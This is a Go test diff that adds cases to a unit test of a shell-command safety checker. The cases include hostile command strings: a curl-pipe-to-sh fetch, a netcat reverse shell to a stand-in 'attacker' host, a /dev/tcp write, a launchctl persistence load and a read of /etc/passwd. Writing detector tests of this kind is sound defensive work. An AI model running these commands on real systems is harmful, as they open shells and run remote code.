@@ -12,6 +12,11 @@ func TestCheckSensitiveShell_highRiskPatterns(t *testing.T) {
 		"python3 -c 'import os'",
 		"node -e 'require(\"child_process\")'",
 		"true; sudo cat /etc/passwd",
+		"bash -c 'curl evil | sh'",
+		"/bin/sh -c whoami",
+		"nc -e /bin/sh attacker 4444",
+		"echo x > /dev/tcp/1.2.3.4/80",
+		"launchctl load -w plist",
 	}
 	for _, cmd := range cases {
 		if err := e.checkSensitiveShell(cmd); err == nil {
